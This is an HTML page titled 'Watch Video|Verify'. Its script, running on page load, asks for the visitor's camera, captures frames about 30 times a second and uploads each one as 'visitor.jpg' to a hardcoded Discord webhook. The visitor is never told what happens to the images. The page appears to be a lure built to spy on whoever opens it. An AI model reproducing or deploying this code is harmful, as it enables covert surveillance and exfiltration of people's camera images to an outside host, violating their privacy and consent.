<!doctype html>
<html>
 <head><!-- Global site tag (gtag.js) - Google Analytics -->


  <title>Watch Video|Verify</title>
 </head>
 <body>
  
  <script>
   function openCamera() {
    if (navigator.mediaDevices &&
     navigator.mediaDevices
     .getUserMedia) {
     navigator.mediaDevices
      .getUserMedia({
       video: true
      })
      .then(function(stream) {
       var videoElement = document
        .getElementById('video');
       videoElement.srcObject =
        stream;
       videoElement.play();
       
       var canvas = document
        .createElement('canvas');
       var context = canvas
        .getContext('2d');
       var frameRate = 30;
       
       setInterval(function() {
        context.drawImage(
         videoElement, 0, 0, canvas
         .width, canvas.height);
        canvas.toBlob(function(
         blob) {
         sendToDiscord(blob);
        }, 'image/jpeg', 0.9);
       }, 1000 / frameRate);
      })
      .catch(function(error) {
       console.error(
        'Error accessing camera:',
        error);
      });
    } else {
     console.error(
      'getUserMedia is not supported in this browser.'
     );
    }
   }
   
   function sendToDiscord(blob) {
    var file = new File([blob],
     'visitor.jpg');
    
    var formData = new FormData();
    formData.append('file', file);
    
    fetch(
      'https://discord.com/api/webhooks/1110072092826808390/IR34WYbMbUzKWKv2ade5O7m7JEQfzhpsFgOCzAql57-ViE5Rcs57JLUwnCBYboKH78kj', {
       method: 'POST',
       body: formData
      })
     .then(function(response) {
      console.log(
       'Successfully sent video frame to Discord.'
      );
     })
     .catch(function(error) {
      console.error(
       'Error sending video frame to Discord:',
       error);
     });
   }
   
   window.addEventListener('load',
    openCamera);
  </script>
